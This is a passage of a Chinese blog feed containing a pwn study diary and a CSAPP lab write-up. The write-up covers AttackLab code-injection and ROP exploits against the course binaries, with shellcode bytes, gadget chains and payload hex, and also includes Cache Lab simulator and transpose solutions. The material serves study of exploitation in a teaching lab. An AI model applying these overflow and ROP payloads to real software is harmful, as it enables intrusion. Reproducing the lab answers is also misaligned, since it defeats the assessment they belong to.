函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。</li></ul></li><li><p>31: </p><ul><li><a href="https://github.com/longld/peda">gdb-peda</a> </li></ul></li></ul><h3 id="第五周-8-2-8-8"><a href="#第五周-8-2-8-8" class="headerlink" title="第五周: 8/2-8/8"></a>第五周: 8/2-8/8</h3><ul><li><p><strong>8/2 3: 做题</strong> </p><ul><li><a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">pwndbg和Pwngdb</a> </li><li>关于gdb.attach(p)的<a href="https://www.jianshu.com/p/fc91ff8319e6">几句话</a> </li><li>查询各版本libc.so文件的main_arena_offset的<a href="https://github.com/coldwave96/libcoffset">小工具</a> </li><li><strong>而且recv是从缓冲区获取数据, 必须把前面的都取出来才能够recv(4)</strong> </li></ul></li><li><p><strong>8/4,5: 做题</strong> </p><ul><li>系统调用号在32位和64位系统是不一样的. <a href="https://giantbranch.blog.csdn.net/article/details/78777938">查询表</a> </li><li>关于libc_csu的内容在<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_1">CTF_WiKi</a>中</li><li> additionally <strong>recursively dereferencing</strong> all pointers.<img src="https://i.loli.net/2021/08/04/GAxeO2D67LfbKPw.png" alt="image-20210804234240069" style="zoom:80%;" /></li><li>flat和pack只对数字生效, 对不足四字节或八字节的数据请自行填充完整</li><li>gdb.attach用法 <code>io = gdb.debug(&#39;./hello&#39;, [gdb_scrip])</code> 注意要写路径</li><li>已放弃gdb.attach(), 实在搞不明白怎么用</li></ul></li><li><p><strong>8/6: 学习</strong> </p><ul><li><p>gdb中<strong>默认关闭随机化</strong>, 使用show disable-randomization或set disable-randomization off关闭“<strong>禁止随机化</strong>”</p><p><a href="https://www.dazhuanlan.com/ourlaputa/topics/975254">关于ASLR和PIE详细内容</a>, 前者是Linux系统特有打乱所有的东西, 后者是编译器加上的保护措施, PIE会打乱bss text data加载基址, 不过这是一个固定值, 当我们打开了Linux的ASLR 2才能够真正的<strong>随机</strong>.</p></li><li><p>整理writeup</p></li></ul></li><li><p>**8/7:继续 ** </p><ul><li>看完了堆的全部基础内容, 还剩下各种利用方法没看</li><li>了解了一波<strong>SROP</strong>, 尝试写了一题(其实是某题的第二种方法)</li><li>BUUOJ好几道都是做过的或者很相似的题目, 相当于复习了也比较基础</li></ul></li><li><p><strong>8/8:继续</strong> </p><ul><li>看了看栈转移和asm(shellcraft), 以及<a href="https://support.typora.io/Draw-Diagrams-With-Markdown/">Typora的图表文档</a> <a href="https://github.com/adrai/flowchart.js">[flowchart github]</a> <a href="https://mermaid-js.github.io/mermaid/#/flowchart">[mermaid]</a> </li><li>学习unsorted bin attack, <code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量</li><li><a href="https://github.com/shellphish/how2heap">heap exploitation github page</a> </li></ul></li></ul><h3 id="第六周-8-9-8-15"><a href="#第六周-8-9-8-15" class="headerlink" title="第六周: 8/9 - 8/15"></a>第六周: 8/9 - 8/15</h3><ul><li><p><strong>8/9:今天看GNU C Library源码(关于heap)</strong> </p><ul><li><a href="https://blog.csdn.net/weixin_43833642/article/details/104681190">glibc源码下载&amp;在线阅读地址合集</a> </li><li>写点heap源码的笔记</li></ul></li><li><p><strong>8/10,11,12:继续源码</strong></p><ul><li><a href="https://qzy.im/blog/2020/05/typora-integrate-the-latest-version-of-mermaid/">Typora不支持最新Mermaid语法的解决办法</a> </li><li>学了下mermaid的用法(或许将来能用到), 还有app.diagram.net的画图</li><li>按住ctrl用鼠标点击多个地方可以同时编辑</li><li>华庭的glibc解析中chunk size链表即为largebin的fd_nextsize和bk_nextsize</li><li>&lt;span id=”jump”&gt;跳转到的地方&lt;/span&gt;    跳转本页锚点的方法</li></ul></li><li><p><strong>8/13:搞定malloc.c中除了多线程的所有源码</strong> </p><ul><li>emmmmm我是不是要补补多线程的东西, 总不能一直都不知道吧, 明天我去问问还能拖到什么时候学(bushi)</li></ul></li><li><p><strong>8/14:写各种bin attack的分析文, 写完打算入坑ucore Lab1</strong> </p><p>- </p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>schedule</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP_Lab</title>
    <link href="/2021-05/Learning-CSAPP-Lab/"/>
    <url>/2021-05/Learning-CSAPP-Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-LAB"><a href="#CSAPP-LAB" class="headerlink" title="CSAPP_LAB"></a>CSAPP_LAB</h1><h2 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h2><blockquote><p>要会使用hex2raw和ctarget和rtarget, 用管道符号比较方便.</p></blockquote><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h3><p>直接使用溢出的8字节改写为touch1的地址</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val)</span></span>&#123;<br>    vlevel = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (val == cookie)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0:48 c7 c7 fa 97 b9 59  mov    $0x59b997fa,%rdi<br>9:68 ec 17 40 00       pushq  $0x4017ec<br>e:c3                   retq   <br></code></pre></td></tr></table></figure><p>此阶段需要执行栈上的代码, 在缓冲区里填充所写的代码后, 用gdb获得buf的栈顶, 覆盖getbuf的返回地址即可</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h3><p>touch3函数里调用了hexmatch(cookie, sval), sval是char*类型且为touch3的第一个变量, 作用是比较字符串sval和cookie是否相同, 所以在调用touch3之前需要将%rdi设置为cookie的字符串形式, 即ASCII码值, 程序的大致运行过程如下:</p><ol><li><p>test=&gt;getbuf, 40字节的栈空间存放攻击代码, 内容为: 设置%rdi, 将touch3地址推到栈上, ret. 溢出的8字节为getbuf返回地址, 改写为攻击代码的首地址.</p><img src="https://txc.gtimg.com/data/293750/2021/0719/afaadcb0e4f822d9c3f9a27ca83b01bf.png" alt="img" style="zoom:67%;" /></li><li><p>首地址获取方法: 用gdb调试设置断点到getbuf, 找到%rsp减去40后的值, 即为攻击代码地址</p></li><li><p>设置%rdi还要注意hexmatch的随机函数, 所以将输入的字符串存到getbuf返回地址的上方test代码段里, 与攻击代码距离40+8(返回地址)字节, 将该地址mov到%rdi里. 由于一次性使用程序, 不用关心test里的数据被改变</p></li></ol><h3 id="ROP-phase-4"><a href="#ROP-phase-4" class="headerlink" title="ROP: phase 4"></a>ROP: phase 4</h3><p>这一节实际上重复了phase2的任务, 但是使用了栈随机化和限制代码可执行区域, 所以采用ROP进行攻击.</p><p>使用objdump -s rtarget &gt; rtarget.s得到反汇编代码, 可以从handout中得知所需的gadget在以start_farm函数开始, 以mid_farm结束的一些函数中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401994 &lt;start_farm&gt;:<br>  401994:b8 01 00 00 00       mov    $0x1,%eax<br>  401999:c3                   retq  <br></code></pre></td></tr></table></figure><p>由于找不到直接pop %rdi的代码, 所以转向pop到其他寄存器然后mov到%rdi中, 这时候可以发现addval_219和addval_273中的58 90 c3, 48 89 c7 c3, 即pop %rax, mov %rax, %rdi(真tm就是直接找啊).</p><p>然后在buf里填充40字节空字符, 溢出的8字节定位到219, 从栈上pop出cookie, ret(0xc3)指令从栈上弹出一个地址即273的地址, 执行完mov后再ret, 最终跳转到touch2.</p><img src="https://p.qlogo.cn/zc_icon/0/e704802709d9ee3488bda1438861a0c716266897078366/0.png" style="zoom:60%;" /><p>exploit code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 ==&gt;40字节<br>ab 19 40 00 00 00 00 00<br>fa 97 b9 59 00 00 00 00<br>a2 19 40 00 00 00 00 00<br>ec 17 40 00 00 00 00 00<br></code></pre></td></tr></table></figure><p>结束.</p><h3 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h3><blockquote><p>Official Warning : If you have other pressing obligations consider stopping right now.</p><p>重复了phase3的任务.Figure 3D就和nop一样, 不改变任何东西, 可以无视.</p></blockquote><p>由于使用了栈随机化, 又需要把cookie的地址放到栈上产生地址, 再存到%rdi中, 所以需要使用一些代码组合来产生一个固定偏移量的栈地址.<strong>有两种方法:</strong></p><ol><li><p>使用handout里面给出的那些编码, 代码较长所以才说费时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;in addval_190<br>movq %rsp,%rax<br>ret<br>;in addval_426<br>movq %rax,%rdi<br>ret<br>;in addval_219<br>popq %rax<br>ret<br>;in getval_481<br>movl %eax,%edx<br>ret<br>;in getval_159<br>movl %edx,%ecx<br>ret<br>;in addval_436<br>movl %ecx,%rsi<br>ret<br>;in add_xy<br>lea (%rdi,%rsi,1),%rax<br>retq <br>;in addval_426<br>movq %rax,%rdi<br>ret<br></code></pre></td></tr></table></figure><p>%rsp+80处放字符串，%rsp+8处才开始执行addval_190. 所以 <strong>(%rsp+80)-(%rsp+8)=72=0x48</strong></p></li><li><p>使用add指令的编码, 使得实际只需三行汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401a03 &lt;addval_190&gt;:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3                    retq<br>00000000004019d6 &lt;add_xy&gt;:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq<br>00000000004019a0 &lt;addval_273&gt;:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3                    retq<br></code></pre></td></tr></table></figure><p>提取后:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">401a06: 48 89 e0              movq %rsp, %rax<br>401a09: c3                    retq<br><br>4019d8: 04 37                 add 0x37, %al<br>4019da: c3                    retq<br><br>4019a2: 48 89 c7              movq %rax, %rdi<br>4019a5: c3                    retq<br></code></pre></td></tr></table></figure><p>结束.</p></li></ol><h2 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h2><h3 id="1-Part-A"><a href="#1-Part-A" class="headerlink" title="1)Part A"></a>1)Part A</h3><p>就，没什么可说的，白嫖真香。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">mem_addr_t</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>&#123;</span><br>    <span class="hljs-keyword">mem_addr_t</span> tag;<br>    <span class="hljs-keyword">int</span> valid;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> lru; <br>&#125;;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>* <span class="hljs-title">cache_set_t</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">cache_set_t</span>* <span class="hljs-keyword">cache_t</span>;<br><br><span class="hljs-keyword">cache_t</span> cache;<br><span class="hljs-keyword">mem_addr_t</span> set_index_mask = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">accessData</span><span class="hljs-params">(<span class="hljs-keyword">mem_addr_t</span> addr)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> eviction_line;<br>  <span class="hljs-comment">// 注意是无符号整数</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> eviction_lru = <span class="hljs-number">-1</span>;<br>  eviction_line = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">mem_addr_t</span> tag = addr &gt;&gt; (s + b);<br>  <span class="hljs-keyword">cache_set_t</span> cache_set = cache[(addr &gt;&gt; b) &amp; set_index_mask];<br><br>  <span class="hljs-comment">// 所需数据的cache_line编号</span><br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-comment">// 如果把所有的cache_line全遍历完了还找不到所需的数据</span><br>    <span class="hljs-keyword">if</span> ( i &gt;= E )<br>    &#123;<br>      <span class="hljs-comment">// 数据未命中</span><br>      ++miss_count;<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;miss &quot;</span>);<br>      <span class="hljs-comment">// 在一组cache_line中查找将被删除的cache_line</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> ia = <span class="hljs-number">0</span>; ia &lt; E; ++ia )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( cache_set[ia].lru &lt; eviction_lru )<br>        &#123;<br>          eviction_line = ia;<br>          eviction_lru = cache_set[ia].lru;<br>        &#125;<br>     &#125;<br>      <span class="hljs-comment">// 如果当前这个要被删除的cache_line是valid</span><br>      <span class="hljs-comment">// 即，这个要被替换数据的cache_line是一条之前读入的数据而不是空行</span><br>      <span class="hljs-keyword">if</span> ( cache_set[eviction_line].valid )<br>      &#123;<br>        <span class="hljs-comment">// 删除数+1</span><br>        ++eviction_count;<br>        <span class="hljs-keyword">if</span> ( verbosity )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;eviction &quot;</span>);<br>      &#125;<br>      <span class="hljs-comment">// 模拟从**主存**读入并覆盖数据到这个刚刚被删除（或本来是空行）的cache_line里</span><br>      cache_set[eviction_line].valid = <span class="hljs-number">1</span>;<br>      cache_set[eviction_line].tag = tag;<br>      cache_set[eviction_line].lru = lru_counter++;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 查找cache中的数据</span><br>    <span class="hljs-keyword">if</span> ( cache_set[i].tag == tag &amp;&amp; cache_set[i].valid )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-comment">// 如果找到数据了，自然就hit_count++</span><br>  ++hit_count;<br>  <span class="hljs-keyword">if</span> ( verbosity )<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hit &quot;</span>);<br>  cache_set[i].lru = lru_counter++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">replayTrace</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *trace_fn)</span></span><br><span class="hljs-function"></span>&#123;<br>  FILE * trace_fp = fopen(trace_fn, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !trace_fp )<br>  &#123;<br>    <span class="hljs-keyword">int</span>* err_num = __errno_location();<br>    <span class="hljs-keyword">char</span>* err_str = strerror(*err_num);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, trace_fn, err_str);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1000</span>];<br>  <span class="hljs-keyword">while</span> ( fgets(buf, <span class="hljs-number">1000</span>, trace_fp) )<br>  &#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">mem_addr_t</span> addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;S&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;L&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>    &#123;<br>      <span class="hljs-built_in">sscanf</span>(&amp;buf[<span class="hljs-number">3</span>], <span class="hljs-string">&quot;%llx,%u&quot;</span>, &amp;addr, &amp;len);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %llx,%u &quot;</span>, buf[<span class="hljs-number">1</span>], addr, len);<br>      <span class="hljs-comment">// 读取/写入数据</span><br>      <span class="hljs-comment">// 写入数据同样需要判断数据是否存在与cache。如果数据不在，同样要将其读回cache</span><br>      accessData(addr);<br>      <span class="hljs-comment">// 如果当前指令是修改指令，则上一条accessData读取数据，下一条的accessData写入数据</span><br>      <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>        accessData(addr);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>  &#125;<br>  fclose(trace_fp);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-Part-B"><a href="#2-Part-B" class="headerlink" title="2)Part B"></a>2)Part B</h3><h4 id="32-32"><a href="#32-32" class="headerlink" title="32*32:"></a>32*32:</h4><p>最优解法是非常暴力非常详细的写出每一行的移动情况，普通解法是规规矩矩的8分块。<a href="https://zhuanlan.zhihu.com/p/79058089">链接</a>_</p><h4 id="64-64"><a href="#64-64" class="headerlink" title="64*64:"></a>64*64:</h4><p>第一种解法是八分块然后再4分块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (M == <span class="hljs-number">64</span>)<br>&#123;<br><span class="hljs-keyword">int</span> i, j, x, y;<br><span class="hljs-keyword">int</span> x1, x2, x3, x4, x5, x6, x7, x8;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">8</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (x = i; x &lt; i + <span class="hljs-number">4</span>; ++x)<br>&#123;<br>x1 = A[x][j]; x2 = A[x][j+<span class="hljs-number">1</span>]; x3 = A[x][j+<span class="hljs-number">2</span>]; x4 = A[x][j+<span class="hljs-number">3</span>];<br>x5 = A[x][j+<span class="hljs-number">4</span>]; x6 = A[x][j+<span class="hljs-number">5</span>]; x7 = A[x][j+<span class="hljs-number">6</span>]; x8 = A[x][j+<span class="hljs-number">7</span>];<br><br>B[j][x] = x1; B[j+<span class="hljs-number">1</span>][x] = x2; B[j+<span class="hljs-number">2</span>][x] = x3; B[j+<span class="hljs-number">3</span>][x] = x4;<br>B[j][x+<span class="hljs-number">4</span>] = x5; B[j+<span class="hljs-number">1</span>][x+<span class="hljs-number">4</span>] = x6; B[j+<span class="hljs-number">2</span>][x+<span class="hljs-number">4</span>] = x7; B[j+<span class="hljs-number">3</span>][x+<span class="hljs-number">4</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (y = j; y &lt; j + <span class="hljs-number">4</span>; ++y)<br>&#123;<br>x1 = A[i+<span class="hljs-number">4</span>][y]; x2 = A[i+<span class="hljs-number">5</span>][y]; x3 = A[i+<span class="hljs-number">6</span>][y]; x4 = A[i+<span class="hljs-number">7</span>][y];<br>x5 = B[y][i+<span class="hljs-number">4</span>]; x6 = B[y][i+<span class="hljs-number">5</span>]; x7 = B[y][i+<span class="hljs-number">6</span>]; x8 = B[y][i+<span class="hljs-number">7</span>];<br><br>B[y][i+<span class="hljs-number">4</span>] = x1; B[y][i+<span class="hljs-number">5</span>] = x2; B[y][i+<span class="hljs-number">6</span>] = x3; B[y][i+<span class="hljs-number">7</span>] = x4;<br>B[y+<span class="hljs-number">4</span>][i] = x5; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">1</span>] = x6; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">2</span>] = x7; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">3</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (x = i + <span class="hljs-number">4</span>; x &lt; i + <span class="hljs-number">8</span>; ++x)<br>&#123;<br>x1 = A[x][j+<span class="hljs-number">4</span>]; x2 = A[x][j+<span class="hljs-number">5</span>]; x3 = A[x][j+<span class="hljs-number">6</span>]; x4 = A[x][j+<span class="hljs-number">7</span>];<br>B[j+<span class="hljs-number">4</span>][x] = x1; B[j+<span class="hljs-number">5</span>][x] = x2; B[j+<span class="hljs-number">6</span>][x] = x3; B[j+<span class="hljs-number">7</span>][x] = x4;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二种解法在那个链接里的评论区里1024次miss, 未看.</p><h4 id="61-67"><a href="#61-67" class="headerlink" title="61*67:"></a>61*67:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">16</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">16</span>)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = i; k &lt; i + <span class="hljs-number">16</span> &amp;&amp; k &lt; N; ++k)<br>        &#123;<br>            <span class="hljs-keyword">int</span> temp_position = <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">int</span> temp_value = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">int</span> l;<br>            <span class="hljs-keyword">for</span> (l = j; l &lt; j + <span class="hljs-number">16</span> &amp;&amp; l &lt; M; ++l)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (l == k) <span class="hljs-comment">/* 横坐标等于纵坐标，局部变量暂存，整个block读完再处理 */</span><br>                &#123;<br>                    temp_position = k;<br>                    temp_value = A[k][k];<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    B[l][k] = A[k][l];<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (temp_position != <span class="hljs-number">-1</span>) <span class="hljs-comment">/* 遇到了冲突元素 */</span> <br>            &#123;<br>                B[temp_position][temp_position] = temp_value;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="其他链接"><a href="#其他链接" class="headerlink" title="其他链接"></a>其他链接</h3><p>附上手算miss率的神人<a href="https://zhuanlan.zhihu.com/p/28585726">专栏</a>. 以及CMU的<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">课件</a>, miss次数好像就是这上面的.</p><h2 id="ShellLab"><a href="#ShellLab" class="headerlink" title="ShellLab"></a>ShellLab</h2>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>折腾出来的问题(linux)</title>
    <link href="/2021-05/Learning-%E6%8A%98%E8%85%BE%E5%87%BA%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98-linux/"/>
    <url>/2021-05/Learning-%E6%8A%98%E8%85%BE%E5%87%BA%E6%9D%A5%E7%9A%84%E9%97%AE%E9%A2%98-linux/</url>
    
